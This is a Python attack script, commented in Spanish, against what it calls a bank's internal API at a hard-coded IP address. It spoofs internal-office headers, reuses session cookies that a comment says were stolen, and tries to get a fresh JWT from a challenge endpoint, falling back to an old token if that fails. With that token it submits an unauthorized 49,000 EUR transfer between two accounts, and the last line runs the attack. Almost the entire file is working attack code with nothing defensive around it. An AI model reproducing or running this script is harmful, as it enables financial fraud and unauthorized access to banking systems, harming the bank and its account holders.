import requests

# === URLs del sistema ===
CHALLENGE_URL = "http://80.78.30.242:9181/api/challenge"
TRANSFER_URL = "http://80.78.30.242:9181/api/send-transfer"

# === Headers desde red interna ====
session = requests.Session()
session.headers.update({
    "Host": "80.78.30.242",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36 (InternalBrowser)",
    "Accept": "text/xml,application/xml,application/xhtml+xml,application/json",
    "Accept-Language": "es-ES;q=0.9,en-US;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "X-Origin-IP": "192.168.1.10",
    "X-Location": "OFICINA-CENTRAL-ES",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/json",
    "X-Session-Type": "BANCO-INTERNAL"
})

# === Cookies de sesión previamente guardadas ===
session.cookies.update({
    "csrftoken": "nuevo_csrftoken_valido",  # Si lo robé antes de que expirara
    "sessionid": "nuevo_sessionid_valido"
})

# === Paso 1: Forzar el sistema a devolver un nuevo token ===
def reforge_jwt_token():
    print("\n[+] Intentando generar nuevo token JWT desde middleware interno...")
    
    # === Si el sistema tiene un endpoint de challenge, lo usamos ===
    response = session.post(CHALLENGE_URL, json={"origin": "BANCO-INTERNAL"})
    if response.status_code == 200 and "token" in response.json():
        print("[+] Nuevo token JWT generado desde challenge de middleware interno:")
        new_jwt = response.json()["token"]
        return new_jwt
    else:
        print("[-] No se logró generar token desde challenge.")
        return None

# === Paso 2: Ejecutar transferencia con nuevo token ===
def inject_new_xfer():
    new_jwt = reforge_jwt_token()
    if not new_jwt:
        print("[!] No hay nuevo token. Probando token antiguo...")
        new_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xxxxx"

    session.headers.update({
        "Authorization": f"Bearer {new_jwt}",
        "X-Token-ID": new_jwt
    })

    xfer_data = {
        "payment_id": "000e5467-e76b-4884-a876-227755660000",
        "instructed_amount": 49000.00,
        "currency": "EUR",
        "debtor_account_id": 1111,
        "creditor_account_id": 4566,
        "status": "PDNG",
        "remittance_information_unstructured": "Aprobado por token reforge."
    }

    print("\n[+] Enviando transferencia con nuevo token...")
    xfer_response = session.post(TRANSFER_URL, json=xfer_data)
    print("Status de transferencia:", xfer_response.status_code)
    print("Texto:", xfer_response.text)

# === Correr el ataque ===
inject_new_xfer()